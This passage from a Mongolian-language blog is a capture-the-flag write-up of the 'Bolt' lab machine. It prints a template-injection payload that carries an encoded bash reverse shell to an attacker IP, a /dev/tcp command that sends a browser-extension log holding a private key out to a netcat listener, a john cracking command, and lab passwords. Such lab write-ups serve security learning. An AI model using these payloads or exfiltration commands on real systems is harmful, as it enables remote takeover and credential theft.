</span></span></code></pre></div><p>invite_code
<code>XNSS-HSJW-3NGU-8XTJ</code></p><h4 id=ssti>SSTI<a hidden class=anchor aria-hidden=true href=#ssti>#</a></h4><p>demo - гоор ороод user үүсгэнэ. Үүсгэсэн user-н нэрийг settings хэсгээс:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span>% with a <span style=color:#f92672>=</span> request<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;application&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fglobals\x5f\x5f&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fbuiltins\x5f\x5f&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fimport\x5f\x5f&#34;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#34;popen&#34;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#34;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNi85MDAxIDA+JjEK | base64 -d | bash&#34;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#34;read&#34;</span><span style=color:#f92672>]()</span> %<span style=color:#f92672>}</span> a <span style=color:#f92672>{</span>% endwith %<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>болгож өөрчлөөд <code>nc</code> асаан <code>mail.bolt.htb</code> нэвтэрч орон баталгаажуулах мэйлийг дараад <code>shell</code>-р орно.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/etc/passbolt/passbolt.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/var/mail/eddie
</span></span></code></pre></div><pre tabindex=0><code>eddie@bolt:~$ cat /var/mail/eddie  
From clark@bolt.htb  Thu Feb 25 14:20:19 2021  
Return-Path: &lt;clark@bolt.htb&gt;  
X-Original-To: eddie@bolt.htb  
Delivered-To: eddie@bolt.htb  
Received: by bolt.htb (Postfix, from userid 1001)  
id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)  
Subject: Important!  
To: &lt;eddie@bolt.htb&gt;  
X-Mailer: mail (GNU Mailutils 3.7)  
Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;  
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)  
From: Clark Griswold &lt;clark@bolt.htb&gt;  
  
Hey Eddie,  
  
The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.  
Once you&#39;re set up you can start importing your passwords.  Please be sure to keep good security in mind - there&#39;s a few things I read about in a security whitepaper that are a little concerning...  
  
-Clark
</code></pre><p>eddie&rsquo;s password: <code>rT2;jW7&lt;eY8!dX8}pQ8%</code></p><p>user.txt</p><pre tabindex=0><code>528abe*******
</code></pre><p>eddie ssh:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>grep -iR <span style=color:#e6db74>&#34;BEGIN PGP&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>grep -iR <span style=color:#e6db74>&#34;PRIVATE KEY&#34;</span>
</span></span></code></pre></div><p>john is required</p><p>etc/hosts</p><pre tabindex=0><code>passbolt.bolt.htb
</code></pre><ul><li>/home/eddie/.gnupg/openpgp-revocs.d/eddie.key</li><li>.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log</li></ul><p>003.log файл локал машин руу хуулах:
local</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span> &gt; 0003.log
</span></span></code></pre></div><p>machine</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log &gt; /dev/tcp/10.10.14.50/9001
</span></span></code></pre></div><p>Хуулсан log-г vim-р орон filter ашиглахад хэрэглэх value:
<code>:%s/\\\\r\\\\n/\r/g</code></p><p>rockyou value:</p><pre tabindex=0><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg private_key.txt
</code></pre><p>eddie-с:</p><pre tabindex=0><code>su root
</code></pre><p>Passwrod:</p><pre tabindex=0><code>(2rmxsNW(Z?3=p/9s
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>